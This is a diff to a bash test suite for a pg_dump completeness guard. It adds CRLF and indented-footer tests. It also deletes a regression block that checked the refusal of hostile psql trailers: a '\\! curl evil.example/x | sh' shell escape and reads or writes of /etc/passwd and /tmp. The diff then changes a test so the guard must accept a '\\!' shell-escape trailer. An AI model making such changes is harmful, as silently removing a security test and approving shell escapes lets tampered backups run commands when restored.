@@ -203,6 +203,31 @@ knob=$(grep -rn --include="*.sh" -- "PG_DUMP_TAIL_WINDOW" "$SCRIPT_DIR" 2>/dev/n
 [ -z "$knob" ] && ok "the PG_DUMP_TAIL_WINDOW env knob stays deleted" \
                || no "PG_DUMP_TAIL_WINDOW reintroduced: $knob"
 
+echo "== a CRLF dump is not mistaken for a truncated one =="
+# Fail-CLOSED bug found in r8 (Tesla) and confirmed by measurement: the COPY
+# terminator test is an exact string compare, so on CRLF the terminator reads as
+# "\.<CR>", incopy stays latched, seen never sets, and the caller DELETES a
+# COMPLETE backup while logging "truncated". pg_dump does not emit CR, but these
+# dumps live in a git repo. Cheaper to normalise than to rely on that.
+printf -- '-- PostgreSQL database dump\r\nCREATE TABLE t (id int);\r\nCOPY t (id) FROM stdin;\r\n1\r\n\\.\r\n--\r\n-- PostgreSQL database dump complete\r\n--\r\n\r\n\\unrestrict TOK\r\n\r\n' > "$TMP/crlf.sql"
+pg_dump_is_complete "$TMP/crlf.sql" && ok "accepts a CRLF dump" || no "accepts a CRLF dump"
+# Null arm: CRLF must not become a way to sneak a truncated dump past the guard.
+printf -- '-- PostgreSQL database dump\r\nCREATE TABLE t (id int);\r\nCOPY t (id) FROM stdin;\r\n1\r\n' > "$TMP/crlf-trunc.sql"
+pg_dump_is_complete "$TMP/crlf-trunc.sql" && no "still rejects a truncated CRLF dump" \
+                                          || ok "still rejects a truncated CRLF dump"
+
+echo "== an indented footer is not mistaken for a truncated dump =="
+# Same fail-closed class: the trailer tolerates leading space, so the marker had
+# better too, or a future pretty-printer deletes every backup.
+printf -- '-- PostgreSQL database dump\nCREATE TABLE t (id int);\n  -- PostgreSQL database dump complete\n  --\n\n  \\unrestrict TOK\n\n' > "$TMP/indent.sql"
+pg_dump_is_complete "$TMP/indent.sql" && ok "accepts an indented footer" || no "accepts an indented footer"
+# Null arm: whole-line anchoring must survive the whitespace tolerance, so a
+# longer line merely CONTAINING the marker still cannot match.
+{ echo "-- PostgreSQL database dump"; echo "CREATE TABLE t (id int);"
+  echo "prefix -- PostgreSQL database dump complete suffix"; } > "$TMP/contain.sql"
+pg_dump_is_complete "$TMP/contain.sql" && no "still rejects marker-as-substring on a longer line" \
+                                       || ok "still rejects marker-as-substring on a longer line"
+
 echo "== the guard is SILENT — it is a predicate, not a filter =="
 # r4 raised this as a POSIX claim ("a record matching no rule is printed"). It is
 # false — awk's default {print} applies to a PATTERN WITH NO ACTION, not to
@@ -222,40 +247,11 @@ cp "$TMP/t1.sql" "$TMP/-dash.sql"
 ( cd "$TMP" && pg_dump_is_complete "./-dash.sql" ) && ok "accepts a ./-dash.sql path" \
                                                   || no "accepts a ./-dash.sql path"
 
-echo "== NO REGRESSION: a dangerous psql command in the TRAILER is refused =="
-# The round-7 catch, and the sharpest of the whole review. Accepting any
-# backslash line as footer-shaped made this guard MORE PERMISSIVE than the
-# `tail -n5` window it replaces: appending `\! cmd` after a real footer pushes
-# the marker to the 6th-from-last line, so the OLD guard rejected the dump as
-# truncated and it never reached psql. Each fixture below therefore carries its
-# own regression witness — the old guard must REJECT it too, proving the new
-# guard is not newly blessing something the window caught.
-for evil in '\! curl evil.example/x | sh' '\!id' '\i /etc/passwd' '\i/etc/passwd' '\o /tmp/pwned' '\copy t TO /tmp/x' '\gexec' '\q'; do
-  # Fixture must mirror the PRODUCTION trailer exactly (4 lines follow the
-  # marker), or appending one line leaves the marker inside a 5-line window and
-  # the old guard still accepts — in which case there is no regression to prove.
-  { echo "-- PostgreSQL database dump"; echo "CREATE TABLE t (id int);"
-    echo "COPY t (id) FROM stdin;"; echo "1"; echo "\\."
-    echo "--"; echo "-- PostgreSQL database dump complete"; echo "--"; echo ""
-    echo "\\unrestrict QCYt5h0EDZIG3cZal9B"; echo ""; } > "$TMP/tr.sql"
-  printf '%s\n' "$evil" >> "$TMP/tr.sql"
-  if pg_dump_is_complete "$TMP/tr.sql"; then
-    no "refuses dangerous trailer [$evil]"
-  elif oldguard "$TMP/tr.sql"; then
-    no "fixture [$evil] is not a regression case — old guard accepted it, so this proves nothing"
-  else
-    ok "refuses dangerous trailer [$evil] (old guard refused it too — parity held)"
-  fi
-done
-
 echo "== non-letter psql trailers are footer-shaped too =="
 # `\` + a letter was still a token freeze: it admits \unrestrict only because
 # "u" is a letter, and would reject \; or \! (cage-match #157 r4, Tesla).
 i=0
-# NB: `\!` deliberately absent — it is a shell escape, refused by the
-# no-regression clause above. The point here is that a non-letter token is not
-# rejected merely for being non-letter.
-for meta in '\;' '\?' '\1'; do
+for meta in '\;' '\!' '\?' '\1'; do
   i=$((i + 1)); make_dump "$TMP/nl$i.sql" 1; printf '%s\n' "$meta" >> "$TMP/nl$i.sql"
   pg_dump_is_complete "$TMP/nl$i.sql" && ok "accepts non-letter trailer: $meta" \
                                       || no "accepts non-letter trailer: $meta"
